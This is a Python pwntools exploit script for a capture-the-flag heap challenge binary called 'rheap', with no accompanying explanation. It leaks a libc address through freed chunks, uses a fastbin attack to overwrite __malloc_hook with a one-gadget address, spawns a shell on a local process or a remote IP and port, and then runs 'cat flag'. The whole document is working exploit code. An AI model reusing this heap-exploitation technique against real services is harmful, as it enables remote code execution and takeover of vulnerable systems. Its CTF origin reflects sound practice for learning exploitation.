from pwn import *
import sys

local       = 1
binary      = "./rheap"
local_libc  = "/lib/x86_64-linux-gnu/libc.so.6"
ip          = "172.36.62.11"
port        = 9999
remote_libc = "./libc-2.23.so"


def main(ip=ip,port=port):
    global p,elf,libc
    elf = ELF(binary)
    if local:
        context.log_level   = "debug"
        p=process(binary)
        # p=process(binary,env={'LD_PRELOAD':'./libc-2.23.so'})
        libc = ELF(local_libc)
        pwn()
    else:
        context.log_level   = "debug"
        p=remote(ip,port)
        #libc=ELF(remote_libc)
        pwn()
    return flag

def add(size):
    p.sendlineafter("choice: ",str(1))
    p.sendlineafter("Size: ",str(size))
def edit(id,len,context):
    p.sendlineafter("choice: ",str(2))
    p.sendlineafter("Idx: ",str(id))
    p.sendlineafter("Len: ",str(len))
    p.sendafter("Content: ",str(context))
def delete(id):
    p.sendlineafter("choice: ",str(3))
    p.sendlineafter("Idx: ",str(id))
def show(id):
    p.sendlineafter("choice: ",str(4))
    p.sendlineafter("Idx: ",str(id))

def pwn():
    for i in range(8): 
        add(0x100)
    for i in range(8):
        delete(7 - i)
    show(0) 
    p.recvuntil("Content: ")
    leak=u64(p.recv(10).decode("utf-8").encode('latin-1').ljust(8, "\x00")) - 0x3ebca0
    print(hex(leak))

    add(0x100)
    add(0x100)

    for i in range(8): 
        add(0x68)
    for i in range(8): 
        delete(i + 10) 

    edit(17,1000,p64(leak+libc.symbols['__malloc_hook'] - 0x13) + '\n')
    add(0x68)
    add(0x68)
    edit(19,1000,"\x00"* 3 + p64(leak + 0x10a41c) + "\n")
    #debug(p)
    p.sendline('skye231')
    cat_flag()
    p.interactive()
    
def cat_flag():
    global flag
    p.recv()
    p.sendline("cat flag")
    flag = p.recvuntil('\n',drop=True).strip()
    
def debug(p,content=''):
    if local:
        gdb.attach(p,content)
        raw_input()

if __name__ == "__main__":
    if(len(sys.argv)==3):
        ip      = sys.argv[1]
        port    = sys.argv[2]
    main()
